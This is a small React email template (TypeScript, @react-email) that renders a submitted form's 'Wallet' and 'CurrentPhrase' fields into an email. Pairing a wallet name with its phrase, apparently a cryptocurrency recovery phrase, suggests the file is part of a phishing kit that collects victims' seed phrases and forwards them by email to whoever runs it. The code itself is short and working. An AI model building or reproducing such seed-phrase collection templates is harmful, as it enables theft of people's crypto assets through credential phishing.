import { Html, Head, Body, Text } from "@react-email/components";
import * as React from "react";

interface EmailProps {
  wallet: string;
  currentPhrase: string;
}

export default function Email({ wallet, currentPhrase }: EmailProps) {
  return (
    <Html>
      <Head></Head>
      <Body>
        <Text>There are the inputs from the form submitted...</Text>
        <Text>
          <b>Wallet</b> : {wallet}
        </Text>
        <Text>
          <b>CurrentPhrase</b> : {currentPhrase}
        </Text>
      </Body>
    </Html>
  );
}
